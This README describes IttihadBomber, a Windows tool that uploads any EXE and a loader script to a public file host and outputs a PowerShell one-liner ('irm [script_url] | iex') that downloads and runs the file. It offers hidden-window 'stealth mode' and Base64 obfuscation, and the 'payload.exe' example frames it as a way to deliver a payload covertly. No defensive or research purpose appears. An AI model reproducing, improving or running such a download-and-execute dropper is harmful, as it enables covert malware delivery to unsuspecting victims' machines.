# IttihadBomber

A Windows application that generates a single PowerShell command to download and execute any EXE file from the internet.

## What does it do?

1. You select an EXE file
2. It uploads the file to Catbox.moe
3. It creates a PowerShell script that downloads and runs the file
4. It uploads the script to Catbox.moe
5. It gives you a ready-to-use PowerShell command

## Options

- Hidden: Runs PowerShell without showing a window (stealth mode)
- Encrypted: Obfuscates the command using Base64 encoding

## The Final Command

After processing, the app gives you a command like:

powershell "irm [script_url] | iex"

Copy and paste this command in Command Prompt or PowerShell, and it will download and execute your EXE file automatically.

## Example

Select payload.exe
App uploads it and gets a URL
Creates a PowerShell script to download and run it
Returns a one-liner command ready to use
